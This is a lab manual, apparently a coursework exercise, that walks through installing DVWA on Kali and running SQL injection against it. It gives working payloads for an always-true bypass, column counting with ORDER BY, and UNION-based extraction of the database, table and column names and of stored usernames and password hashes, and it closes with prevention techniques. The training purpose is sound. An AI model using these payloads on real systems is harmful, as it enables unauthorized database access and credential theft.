@@ -1,0 +1,370 @@
+# AIM
+
+To understand and perform SQL Injection attacks on intentionally vulnerable web applications such as DVWA, and to study how improper input validation can lead to authentication bypass and unauthorized database access.
+
+---
+
+# REQUIREMENTS
+
+* Kali Linux
+* DVWA (Damn Vulnerable Web Application)
+* Apache Server
+* MySQL/MariaDB
+* Firefox Browser
+* Basic SQL Knowledge
+
+---
+
+# PROCEDURE
+
+# Part A: Setting Up DVWA
+
+## Step 1: Open Kali Linux
+
+1. Start the Kali Linux virtual machine.
+2. Log in to the system.
+
+---
+
+## Step 2: Open Terminal
+
+1. Open the Terminal application in Kali Linux.
+
+---
+
+## Step 3: Update Package Repository
+
+Execute the following command:
+
+```bash id="0trrlo"
+sudo apt update
+```
+
+Wait until package lists are updated successfully.
+
+---
+
+## Step 4: Install DVWA
+
+Execute:
+
+```bash id="z2h0fu"
+sudo apt install dvwa -y
+```
+
+This installs DVWA and required dependencies.
+
+---
+
+## Step 5: Start Apache Service
+
+Execute:
+
+```bash id="dbb28z"
+sudo service apache2 start
+```
+
+This starts the Apache web server.
+
+---
+
+## Step 6: Start MySQL/MariaDB Service
+
+Execute:
+
+```bash id="2j7wzw"
+sudo service mysql start
+```
+
+This starts the database server.
+
+---
+
+## Step 7: Configure DVWA Database Settings
+
+Open the DVWA configuration file:
+
+```bash id="xdvsmr"
+sudo nano /etc/dvwa/config.inc.php
+```
+
+Find the following line:
+
+```php id="78g6vf"
+$_DVWA['db_password'] = '';
+```
+
+Ensure the password field is empty as shown above.
+
+Save the file:
+
+* Press `Ctrl + O`
+* Press `Enter`
+
+Exit Nano editor:
+
+* Press `Ctrl + X`
+
+---
+
+## Step 8: Open DVWA in Firefox
+
+1. Open Firefox browser.
+2. Enter the following URL:
+
+```text id="jlwmcq"
+http://127.0.0.1/dvwa
+```
+
+3. DVWA login page appears.
+
+---
+
+## Step 9: Login to DVWA
+
+Use the default credentials:
+
+```text id="8pc4cq"
+Username: admin
+Password: password
+```
+
+Click **Login**.
+
+---
+
+## Step 10: Create/Reset Database
+
+1. Click:
+
+   ```text id="6eztlt"
+   Create / Reset Database
+   ```
+2. Wait until the database setup completes successfully.
+
+---
+
+## Step 11: Set Security Level
+
+1. In DVWA menu, click:
+
+   ```text id="dsm2q9"
+   DVWA Security
+   ```
+2. Set:
+
+   ```text id="3g4vbn"
+   Security Level = Low
+   ```
+3. Click:
+
+   ```text id="q2g1xb"
+   Submit
+   ```
+
+This intentionally disables protections for educational testing.
+
+---
+
+# Part B: Performing SQL Injection Attack
+
+## Step 12: Open SQL Injection Module
+
+1. In DVWA sidebar menu, click:
+
+   ```text id="qvg9l4"
+   Vulnerabilities → SQL Injection
+   ```
+
+2. A User ID input field appears.
+
+---
+
+# Basic SQL Injection Testing
+
+## Step 13: Test Normal Input
+
+Enter:
+
+```text id="h0cxrf"
+1
+```
+
+Click **Submit**.
+
+Observation:
+
+* User information is displayed normally.
+
+---
+
+## Step 14: Perform Authentication Bypass
+
+Enter the following payload:
+
+```sql id="65x3b5"
+1' OR '1'='1
+```
+
+Click **Submit**.
+
+Observation:
+
+* All user records are displayed.
+* This confirms SQL Injection vulnerability.
+
+Explanation:
+
+* `'1'='1'` is always true.
+* The SQL query condition becomes true for every record.
+
+---
+
+# Part C: Database Enumeration
+
+## Step 15: Find Number of Columns
+
+Test the following inputs one by one:
+
+```sql id="scjlwm"
+1' ORDER BY 1-- -
+```
+
+```sql id="9l7y4n"
+1' ORDER BY 2-- -
+```
+
+```sql id="u0g9d2"
+1' ORDER BY 3-- -
+```
+
+Observation:
+
+* Continue increasing the number until an SQL error appears.
+* The last successful number indicates total columns in the query.
+
+---
+
+## Step 16: Perform UNION-Based Injection
+
+Enter:
+
+```sql id="hl4y3k"
+1' UNION SELECT 1,2-- -
+```
+
+Observation:
+
+* The application displays values `1` and `2`.
+* Confirms UNION SELECT injection works.
+
+---
+
+## Step 17: Extract Database Name
+
+Enter:
+
+```sql id="5m5vaz"
+1' UNION SELECT database(),2-- -
+```
+
+Observation:
+
+* Current database name is displayed.
+
+---
+
+## Step 18: Extract Table Names
+
+Enter:
+
+```sql id="g0xukm"
+1' UNION SELECT table_name,2
+FROM information_schema.tables
+WHERE table_schema=database()-- -
+```
+
+Observation:
+
+* Names of tables in the current database are displayed.
+
+---
+
+## Step 19: Extract Column Names
+
+Enter:
+
+```sql id="0fbm2d"
+1' UNION SELECT column_name,2
+FROM information_schema.columns
+WHERE table_name='users'-- -
+```
+
+Observation:
+
+* Column names from the `users` table are displayed.
+
+---
+
+## Step 20: Extract Usernames and Passwords
+
+Enter:
+
+```sql id="jlwmz7"
+1' UNION SELECT user,password FROM users-- -
+```
+
+Observation:
+
+* Usernames and password hashes are displayed.
+
+---
+
+# OBSERVATIONS
+
+1. DVWA was successfully installed and configured.
+2. Apache and MySQL services started successfully.
+3. The SQL Injection vulnerability was accessible at low security level.
+4. Normal input displayed only specific user information.
+5. The payload:
+
+   ```sql
+   ' OR '1'='1
+   ```
+
+   bypassed authentication conditions.
+6. SQL Injection allowed unauthorized database access.
+7. Database name, table names, and column names were extracted successfully.
+8. Usernames and password hashes were retrieved from the database.
+9. The experiment demonstrated the dangers of unsanitized user input.
+
+---
+
+# RESULT
+
+The SQL Injection attack was successfully performed on DVWA. The experiment demonstrated:
+
+* Authentication bypass
+* Database enumeration
+* Unauthorized data extraction
+* Exposure of usernames and password hashes
+
+The vulnerable application failed to validate user input properly, allowing malicious SQL queries to execute successfully.
+
+---
+
+# CONCLUSION
+
+The experiment proved that improper input validation leads to SQL Injection vulnerabilities. Attackers can exploit these vulnerabilities to bypass authentication and extract sensitive database information. Secure coding practices and proper database security mechanisms are essential to protect web applications from SQL Injection attacks.
+
+---
+
+# PREVENTION TECHNIQUES
+
+1. Prepared Statements (Parameterized Queries)
+2. Input Validation and Sanitization
+3. Stored Procedures
+4. Web Application Firewalls (WAF)
+5. Least Privilege Database Access
+
+---
